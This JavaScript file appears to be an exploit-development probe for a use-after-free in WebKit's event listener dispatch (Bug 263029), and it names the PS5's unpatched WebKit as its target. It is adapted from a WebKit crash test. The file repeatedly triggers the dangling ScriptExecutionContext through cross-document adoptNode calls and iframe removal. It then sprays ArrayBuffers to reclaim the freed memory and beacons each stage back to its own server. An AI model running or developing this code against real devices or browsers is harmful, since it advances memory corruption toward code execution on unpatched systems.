// p184 — EventTarget::innerInvokeEventListeners UAF
// WebKit Bug 263029 — Document destruction during event firing
// Fixed Dec 19, 2023 (Safari 17.1.2/17.2). PS5 runs 17.0 = VULNERABLE.
//
// Root cause: innerInvokeEventListeners holds a raw pointer to the
// ScriptExecutionContext. If the document is destroyed during event
// dispatch (via adoptNode + iframe removal), the pointer dangles.
//
// Trigger: create div tree in iframe doc, bubble event, adopt back
// to main doc and destroy iframe during bubble → UAF.
//
// Adapted from WebKit LayoutTests/fast/events/
//   document-destruction-during-event-firing-crash.html
//
// Beacon prefix: V184-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V184-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // === PHASE 1: Basic crash test (from the WebKit test case) ===
  // If the bug exists, this should crash the tab/process
  // We beacon BEFORE the trigger — if we don't see POST-TRIGGER,
  // the tab crashed = bug exists!

  function attemptUAF(attempt) {
    syncB('ATT-' + attempt + '-START');

    try {
      var f = document.body.appendChild(document.createElement('iframe'));
      f.srcdoc = '<html><body></body></html>';

      f.onload = function() {
        syncB('ATT-' + attempt + '-IFRAME-READY');

        var a = document.createElement('div');
        var b = a.appendChild(document.createElement('div'));

        // Listener on 'a' (parent): adopt back to main doc, destroy iframe, throw
        a.addEventListener('uaf', eval("(function() {\n" +
          "document.adoptNode(a);\n" +
          "f.remove();\n" +
          "throw {\n" +
          "  line: 1,\n" +
          "  column: 1,\n" +
          "  sourceURL: 'A'.repeat(1024 * 1024 * 4) + 'B'.repeat(1024 * 1024 * 4)\n" +
          "};\n" +
        "})"));

        // Second listener on 'a' (must exist for bug to trigger)
        a.addEventListener('uaf', function() {});

        // Listener on 'b' (child): adopt parent into iframe's document
        b.addEventListener('uaf', function() {
          try {
            f.contentDocument.adoptNode(a);
            syncB('ATT-' + attempt + '-ADOPTED');
          } catch(e) {
            syncB('ATT-' + attempt + '-ADOPT-ERR-' + (e.message || '').substring(0, 20));
          }
        });

        syncB('ATT-' + attempt + '-PRE-DISPATCH');

        // Fire the event — bubbles from b to a
        try {
          b.dispatchEvent(new Event('uaf', {bubbles: true}));
        } catch(e) {
          // If the throw in the listener propagates here, the UAF may or may not
          // have happened already
          syncB('ATT-' + attempt + '-DISPATCH-THREW');
        }

        syncB('ATT-' + attempt + '-POST-DISPATCH');

        // If we reach here, either:
        // 1. The bug was triggered but didn't crash (we can try to exploit)
        // 2. The fix is present (no UAF)
        // 3. adoptNode didn't work cross-document
      };
    } catch(e) {
      syncB('ATT-' + attempt + '-OUTER-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // === PHASE 2: Variant with srcdoc timing ===
  // Some browsers handle srcdoc iframes synchronously
  function attemptUAFSync(attempt) {
    syncB('SYN-' + attempt + '-START');

    try {
      var f = document.createElement('iframe');
      document.body.appendChild(f);
      // Access contentDocument directly (about:blank)
      var iframeDoc = f.contentDocument;

      if (!iframeDoc) {
        syncB('SYN-' + attempt + '-NO-DOC');
        return;
      }

      var a = document.createElement('div');
      var b = a.appendChild(document.createElement('div'));

      a.addEventListener('uaf', eval("(function() {\n" +
        "document.adoptNode(a);\n" +
        "f.remove();\n" +
        "throw {\n" +
        "  line: 1,\n" +
        "  column: 1,\n" +
        "  sourceURL: 'X'.repeat(1024 * 1024 * 8)\n" +
        "};\n" +
      "})"));

      a.addEventListener('uaf', function() {});

      b.addEventListener('uaf', function() {
        try {
          iframeDoc.adoptNode(a);
          syncB('SYN-' + attempt + '-ADOPTED');
        } catch(e) {
          syncB('SYN-' + attempt + '-ADOPT-ERR');
        }
      });

      syncB('SYN-' + attempt + '-PRE-DISPATCH');

      try {
        b.dispatchEvent(new Event('uaf', {bubbles: true}));
      } catch(e) {
        syncB('SYN-' + attempt + '-THREW');
      }

      syncB('SYN-' + attempt + '-POST-DISPATCH');
    } catch(e) {
      syncB('SYN-' + attempt + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // === PHASE 3: Multiple rapid attempts with heap pressure ===
  function attemptUAFRapid(attempt) {
    syncB('RAP-' + attempt + '-START');

    try {
      // Create heap pressure first
      var garbage = [];
      for (var g = 0; g < 100; g++) {
        garbage.push(new ArrayBuffer(65536));
      }

      var f = document.createElement('iframe');
      document.body.appendChild(f);
      var iframeDoc = f.contentDocument;

      if (!iframeDoc) {
        syncB('RAP-' + attempt + '-NO-DOC');
        return;
      }

      var a = document.createElement('div');
      var b = a.appendChild(document.createElement('div'));

      // Pre-allocate spray buffers
      var sprays = [];
      for (var s = 0; s < 200; s++) {
        var ab = new ArrayBuffer(256);
        var view = new Uint32Array(ab);
        for (var j = 0; j < view.length; j++) {
          view[j] = 0x41424344;
        }
        sprays.push(ab);
      }

      a.addEventListener('uaf', function() {
        document.adoptNode(a);
        f.remove();
        f = null;

        // Force GC
        garbage = null;
        for (var gc = 0; gc < 50000; gc++) {
          var t = {x: gc};
        }

        // Spray to reclaim freed ScriptExecutionContext
        for (var s = 0; s < 500; s++) {
          var ab = new ArrayBuffer(512);
          var v = new Uint32Array(ab);
          v[0] = 0xDEADBEEF;
          v[1] = 0xCAFEBABE;
          sprays.push(ab);
        }

        syncB('RAP-' + attempt + '-SPRAYED');

        throw {
          line: 1,
          column: 1,
          sourceURL: 'Z'.repeat(1024 * 512)
        };
      });

      a.addEventListener('uaf', function() {
        syncB('RAP-' + attempt + '-SECOND-HANDLER');
      });

      b.addEventListener('uaf', function() {
        iframeDoc.adoptNode(a);
      });

      b.dispatchEvent(new Event('uaf', {bubbles: true}));

      syncB('RAP-' + attempt + '-POST-DISPATCH');
    } catch(e) {
      syncB('RAP-' + attempt + '-ERR');
    }
  }

  // Run sync variants first (no iframe load wait)
  for (var i = 0; i < 3; i++) {
    attemptUAFSync(i);
  }

  // Then rapid attempts with heap spray
  for (var i = 0; i < 5; i++) {
    attemptUAFRapid(i);
  }

  // Then async variants with srcdoc
  var asyncCount = 0;
  function nextAsync() {
    if (asyncCount >= 3) {
      syncB('ALL-DONE');
      return;
    }
    attemptUAF(asyncCount);
    asyncCount++;
    setTimeout(nextAsync, 500);
  }
  nextAsync();

})();
